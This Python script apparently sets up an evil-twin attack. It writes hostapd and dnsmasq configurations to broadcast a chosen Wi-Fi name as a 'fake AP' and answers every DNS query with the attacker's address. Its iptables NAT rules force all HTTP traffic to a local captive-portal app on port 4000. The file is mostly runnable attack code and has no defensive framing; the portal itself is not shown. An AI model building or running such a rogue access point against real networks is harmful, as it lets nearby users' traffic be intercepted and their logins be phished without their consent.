import os

from scapy.all import *
from scapy.layers.dot11 import Dot11Elt, Dot11Beacon, Dot11, RadioTap


def reset_setting(iface):
    # os.system('service NetworkManager start')
    # os.system('service apache2 stop')

    os.system('service hostapd stop')
    os.system('service dnsmasq stop')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    os.system('systemctl unmask systemd-resolved >/dev/null 2>&1')
    os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl start systemd-resolved >/dev/null 2>&1')
    os.system('sudo iptables -F')
    os.system('sudo iptables -t nat -F')
    os.system('nmcli dev set ' + iface + ' managed yes')


def hostapd_conf(iface, essid="Test"):
    setup = "interface=" + iface + "\nssid=" + essid + "\ndriver=nl80211\nchannel=7\nhw_mode=g\n"
    ### If this file is exists, we delete it.
    try:
        os.remove("hostapd.conf")
    except:
        pass
    ### Create and write the hostapd configuration file.
    hostapd = open("hostapd.conf", "w+")
    hostapd.write(setup)


def dnsmasq_conf(interface):
    setup = "interface=" + interface + "\ndhcp-range=10.0.0.10,10.0.0.100,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6," \
                                       "10.0.0.1\naddress=/#/10.0.0.1\nlog-queries\nlog-dhcp\n   "
    # Set the range of the IP address allocations, and the time limit for each allocation.
    # Set the gateway address of the fake AP (3 stand for gateway address).
    # Set the DNS server address of the fake AP (6 stand for DNS server address).
    # Set the IP address of the fake AP. All queries will be sent to this address.
    ### If this file is exists, we delete it.
    try:
        os.remove("dnsmasq.conf")
    except:
        pass
    ### Create and write the hostapd configuration file.
    dnsmasq = open("dnsmasq.conf", "w+")
    dnsmasq.write(setup)


def run_AP():
    os.system('dnsmasq -C dnsmasq.conf')
    os.system('gnome-terminal -- sh -c "cd captive_portal && npm start"')
    os.system('hostapd hostapd.conf -B')
    os.system('route add default gw 10.0.0.1')


def fake_ap(iface, wifi_name):
    reset_setting(iface)
    # os.system('nmcli dev set ' + iface + ' managed no')

    # disabling dnsmasq service, below the code to revert the action
    os.system('systemctl stop systemd-resolved >/dev/null 2>&1')
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl mask systemd-resolved >/dev/null 2>&1')
    # changes the interface and fake access point ip to 10.0.0.1
    os.system('ifconfig ' + iface + ' inet 10.0.0.1 netmask 255.255.255.0')
    os.system('route add default gw 10.0.0.1')

    # enable ip forwarding (changes the value to 1)
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    os.system('sudo iptables --table nat --append PREROUTING --protocol tcp --dport 80 --jump REDIRECT --to-port 4000')

    os.system(
        'sudo iptables --table nat --append PREROUTING --protocol tcp --dport 80 --jump DNAT --to-destination '
        '10.0.0.1:4000')

    os.system('sudo iptables --table nat --append OUTPUT --protocol tcp --dport 80 --jump REDIRECT --to-port 4000')

    os.system(
        'sudo iptables --table nat --append OUTPUT --protocol tcp --dport 80 --jump DNAT --to-destination 10.0.0.1:4000')

    os.system('sudo iptables --table nat --append POSTROUTING --out-interface ' + str(iface) + ' --jump MASQUERADE')
    os.system('sudo iptables -P FORWARD ACCEPT')
    os.system('sudo iptables -A INPUT -j ACCEPT >> /dev/null 2>&1')
    os.system('sudo iptables -A OUTPUT -j ACCEPT >> /dev/null 2>&1')

    hostapd_conf(iface, wifi_name)
    os.system('hostapd hostapd.conf -B')

    dnsmasq_conf(iface)
    os.system('dnsmasq -C dnsmasq.conf')
